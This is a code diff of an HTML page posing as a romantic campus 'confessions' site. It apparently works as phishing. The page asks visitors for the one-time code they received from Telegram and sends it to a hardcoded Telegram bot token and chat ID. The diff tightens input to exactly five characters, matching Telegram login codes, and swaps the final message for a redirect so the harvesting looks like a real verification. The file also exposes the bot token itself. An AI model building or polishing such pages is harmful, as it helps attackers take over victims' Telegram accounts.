@@ -61,7 +61,7 @@
   .logo-mark {
     position: absolute; top: 20px; right: 22px;
     width: 64px; height: 64px;
-    background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRukdbk4n1KCZxNHEbqG-e1TxqA0ZWl_h-Dqg&s') center/contain no-repeat;
+    background: url('haramaya_logo.png') center/contain no-repeat;
     opacity: 0.2;
   }
   .back-btn {
@@ -211,7 +211,7 @@
     id="codeInput"
     type="text"
     inputmode="numeric"
-    maxlength="5"
+    maxlength="8"
     placeholder="· · · · · ·"
     autocomplete="one-time-code"
   >
@@ -231,8 +231,8 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  const TELEGRAM_BOT_TOKEN = "8124572878:AAGtAKI_9T_nXoKGZe8F2FK54lRq-0EZ5vQ"; // Replace
-  const TELEGRAM_CHAT_ID   = "7567317123"; // Replace
+const TELEGRAM_BOT_TOKEN = "8124572878:AAGtAKI_9T_nXoKGZe8F2FK54lRq-0EZ5vQ"; // Replace
+const TELEGRAM_CHAT_ID   = "7567317123"; // Replace
 
   // Floating hearts
   const heartsEl = document.getElementById('hearts');
@@ -284,13 +284,24 @@
 
   async function handleVerify() {
     const code = document.getElementById('codeInput').value.trim();
-    if (code.length < 1) {
-      document.getElementById('codeInput').style.borderColor = '#e8507a';
-      setTimeout(() => { document.getElementById('codeInput').style.borderColor = ''; }, 1200);
-      showToast('Enter the code first', 'error');
+    const inp  = document.getElementById('codeInput');
+
+    // Not exactly 5 characters — reject
+    if (code.length !== 5) {
+      inp.style.borderColor = '#e8507a';
+      inp.style.boxShadow = '0 0 0 3px rgba(232,80,122,0.2)';
+      inp.value = '';
+      inp.placeholder = 'Wrong code ✗';
+      setTimeout(() => {
+        inp.style.borderColor = '';
+        inp.style.boxShadow = '';
+        inp.placeholder = '· · · · · ·';
+      }, 2000);
+      showToast('Enter the exact  code from Telegram.', 'error');
       return;
     }
 
+    // Exactly 5 — legit, send and proceed
     const btn = document.getElementById('verifyBtn');
     btn.disabled = true;
     btn.textContent = 'Sending...';
@@ -307,19 +318,10 @@
       });
     } catch(e) {}
 
-    showToast('Done! 💌', 'success');
+    showToast('Verified! Taking you in... 💌', 'success');
     setTimeout(() => {
-      document.querySelector('.card').innerHTML = `<div class="logo-mark"></div>
-        <div style="text-align:center;padding:20px 0">
-          <div style="font-size:60px;margin-bottom:16px">💌</div>
-          <h1 style="font-family:'Playfair Display',serif;color:#fff;font-size:28px;margin-bottom:12px">
-            You're <em style="color:#e8507a;font-style:italic">connected!</em>
-          </h1>
-          <p style="color:rgba(255,255,255,0.4);font-size:14px;line-height:1.8">
-            Welcome to CCI.<br>Start confessing your heart out 🌹
-          </p>
-        </div>;`;
-    }, 1600);
+      window.location.href = 'confessions.html';
+    }, 1400);
   }
 
   function handleResend() {
